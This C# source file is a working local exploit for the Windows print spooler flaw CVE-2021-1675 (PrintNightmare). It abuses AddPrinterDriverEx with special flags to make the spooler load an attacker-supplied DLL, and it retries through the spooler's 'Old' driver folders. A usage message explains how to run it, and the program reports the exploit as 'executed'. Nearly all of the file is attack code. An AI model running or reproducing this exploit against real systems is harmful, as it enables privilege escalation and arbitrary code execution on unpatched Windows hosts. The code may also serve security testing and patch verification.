using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace CVE_2021_1675
{
    class Program
    {
        private const uint APD_COPY_ALL_FILES = 0x00000004;

        [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool AddPrinterDriverEx(string pName, uint Level, [In, Out] IntPtr pDriverInfo, uint flags);

        public struct DRIVER_INFO_2
        {
            public uint cVersion;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pEnvironment;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDriverPath;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDataFile;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pConfigFile;
        }
        static void Help()
        {
            Console.WriteLine("Please enter a path to a loaded driver and a DLL");
            Console.WriteLine("");
            Console.WriteLine("Example: CVE-2021-1675.exe /driverpath:c:\\absolete\\path /dll:c:\\absolete\\path>");
            System.Environment.Exit(1);
        }

        static void AddPrinterDriver(string driverpath, string datafile)
        {
            DRIVER_INFO_2 Level2 = new DRIVER_INFO_2
            {
                cVersion = 3,
                pName = "Thalpius",
                pEnvironment = "Windows x64",
                pDriverPath = driverpath,
                pDataFile = datafile,
                pConfigFile = datafile,
            };

            uint flags = APD_COPY_ALL_FILES | 0x10 | 0x8000;

            IntPtr pLevel2 = Marshal.AllocHGlobal(Marshal.SizeOf(Level2));
            Marshal.StructureToPtr(Level2, pLevel2, false);

            AddPrinterDriverEx(null, 2, pLevel2, flags);
            Marshal.FreeHGlobal(pLevel2);

            string fileName = Path.GetFileName(datafile);

            for (int i = 1; i <= 10; i++)
            {
                Level2.pConfigFile = $"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Old\\{i}\\{fileName}";
                IntPtr pLevel2_ = Marshal.AllocHGlobal(Marshal.SizeOf(Level2));
                Marshal.StructureToPtr(Level2, pLevel2_, false);

                AddPrinterDriverEx(null, 2, pLevel2_, flags);
                Marshal.FreeHGlobal(pLevel2_);
            }
        }
        static int Main(string[] args)
        {
            if (args.Length == 0 | args.Length > 2)
            {
                Help();
            }
            String argumentDriverPath = args[0].ToString().ToLower();
            String argumentDll = args[1].ToString().ToLower();
            if (argumentDriverPath.StartsWith("/driverpath:") && argumentDll.StartsWith("/dll:"))
            {
                String driverPath = argumentDriverPath.Remove(0, 12);
                String dataFile = argumentDll.Remove(0, 5);
                AddPrinterDriver(driverPath, dataFile);
                Console.WriteLine("Vulnerability CVE-2021-1675 executed!");
            }
            else
            {
                Help();
            }
            return 0;
        }
    }
}
